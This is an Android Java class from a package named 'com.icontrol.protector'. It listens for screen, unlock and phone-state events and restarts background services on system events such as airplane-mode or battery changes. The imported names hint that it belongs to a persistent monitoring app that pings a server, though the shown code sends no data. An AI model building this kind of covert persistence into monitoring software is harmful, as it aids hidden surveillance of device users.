package com.icontrol.protector;

import static com.icontrol.protector.Consts.Rec_Activitys;
import static com.icontrol.protector.MySettings.ReadBool;
import static com.icontrol.protector.UtliTools.ServiceStarter;
import static com.icontrol.protector.UtliTools.setupWorkManager;
import static com.icontrol.protector.WorkServices.MyWorker.SendPing;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;



import java.text.SimpleDateFormat;
import java.util.Locale;


public class StatusMonitor {

    private BroadcastReceiver screenReceiver;
    private BroadcastReceiver ResetServices;
    private Context context;

    public StatusMonitor(Context context) {
        this.context = context;
        registerScreenReceiver();
    }

    private void registerScreenReceiver() {
        try{
            screenReceiver = new WorkServices.ScreenReceiver();
            IntentFilter filter = new IntentFilter();
            filter.addAction(Intent.ACTION_SCREEN_ON);
            filter.addAction(Intent.ACTION_SCREEN_OFF);
            filter.addAction("android.intent.action.PHONE_STATE");
            filter.addAction(Intent.ACTION_USER_PRESENT);
            context.registerReceiver(screenReceiver, filter);
        }catch (Exception a){
            screenReceiver = null;
        }

        try{
            ResetServices= new ResetServices();
            IntentFilter filter2 = new IntentFilter();
            filter2.addAction(Intent.ACTION_AIRPLANE_MODE_CHANGED);
            filter2.addAction(Intent.ACTION_BATTERY_LOW);
            filter2.addAction(Intent.ACTION_BATTERY_OKAY);
            filter2.addAction(Intent.ACTION_LOCALE_CHANGED);
            filter2.addAction(Intent.ACTION_TIMEZONE_CHANGED);
           // filter2.addAction(Intent.ACTION_TIME_TICK);
            filter2.addAction(Intent.ACTION_DEVICE_STORAGE_LOW);
            filter2.addAction(Intent.ACTION_DEVICE_STORAGE_OK);
            context.registerReceiver(ResetServices, filter2);
        }catch (Exception s){
            ResetServices = null;
        }
    }


    public void unregister() {
        if (screenReceiver != null) {
            context.unregisterReceiver(screenReceiver);
            screenReceiver = null;
        }
        if(ResetServices != null){
            context.unregisterReceiver(ResetServices);
            ResetServices = null;
        }
    }

}
